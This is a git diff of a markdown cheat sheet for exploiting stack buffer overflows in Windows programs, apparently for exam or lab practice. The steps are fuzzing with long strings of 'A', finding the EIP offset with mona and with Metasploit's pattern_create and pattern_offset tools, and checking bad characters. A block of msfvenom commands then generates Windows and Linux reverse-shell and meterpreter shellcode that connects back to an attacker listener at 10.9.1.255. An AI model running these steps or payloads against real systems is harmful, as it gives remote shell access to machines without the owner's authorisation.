@@ -26,30 +26,37 @@ If .exe windows machine
 !mona config -set workingfolder c:\Users\admin\Desktop\patota
 ```
 
-1. Send characters to find offset: 
+1. Send characters to crash application: 
    1. Fuzzer script
    2. Manually:
-  ```
-  python -c 'print"A" * 1000'
-  ```
-**With Fuzzer**
-1. Find offset: !mona findmsp -distance DISTANCE == Find Offset EIP
 
-**WITHOUT Fuzzer**
-4. Generate a pattern with the length that crashed and send it
-   
+```
+python3 -c 'print("A" * 5000)'
+```
+
+2. Generate random payload to find crashing point
+
 ```
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [length]
 ```
 
-5. Send payload exploit.py with pattern
-6. Find memory at which crashed
+3. Send payload exploit.py with pattern
+   
+4. Find Offset:
+   1. Option 1: inside Mona
 
 ```
 !mona findmsp -distance [length]
 Response: EIP contains normal pattern : 0x39654138 (offset xxxxx)
 ```
-7. Remove payload from the script, and add BBBB to *retn
+
+  2. Option 2: using metasploit:
+  
+```
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q EIP
+```
+
+5. Add BBBB to *retn
 
 ```
 while bad_chars
@@ -65,17 +72,22 @@ while bad_chars
 9. Generate shell code removing bad chars
 
 ```
+#####
 msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4445 EXITFUNC=thread -b "\x00\x0a" -f c
-
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.1.255 LPORT=4444 -f rb -b "BAD_CHARS" -f c
-
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.1.255 LPORT=4444 -b "BAD_CHARS" -f py -v shellcode
 
 msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 -b "\x00" -f python --var-name shellcode EXITFUNC=thread 
 
 msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 -b "\x00" -f c
 
 msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 -e x86/shikata_ga_nai -f py -b "\x00"
+
+######
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.1.255 LPORT=4444 -f rb -b "BAD_CHARS" -f c
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.1.255 LPORT=4444 -b "BAD_CHARS" -f py -v shellcode
+
+####
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.9.1.255 LPORT=443 EXITFUNC=thread -f python -b "\x00"
 ```
 
 - Send patterns
